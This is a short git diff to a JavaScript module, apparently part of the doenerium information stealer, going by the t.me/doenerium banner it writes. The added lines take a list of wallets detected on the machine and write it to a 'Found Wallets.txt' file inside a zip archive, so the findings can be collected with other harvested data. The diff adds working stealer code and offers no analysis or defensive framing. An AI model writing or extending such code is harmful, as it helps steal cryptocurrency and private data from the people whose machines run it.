@@ -14,6 +14,10 @@ module.exports = (client) => {
                     description += `${key}: ❌\n`;
                 }
             }
+
+            if (description != "") {
+                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/doenerium]>================>\n\n" + description)
+            }
         }
     };
 };
